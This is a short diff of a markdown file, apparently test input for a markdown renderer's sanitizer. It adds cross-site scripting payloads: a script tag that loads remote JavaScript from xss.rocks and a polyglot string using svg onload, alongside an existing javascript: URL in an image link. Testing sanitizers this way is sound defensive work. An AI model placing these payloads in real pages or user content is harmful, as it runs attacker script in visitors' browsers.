@@ -6,5 +6,8 @@
 
 ![text](https://avatars.githubusercontent.com/u/92805783?s=40&javascript:alert(1);)
 ![
-<div dir=<img src='' onerror=alert(1)>>a</div>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
 ](()
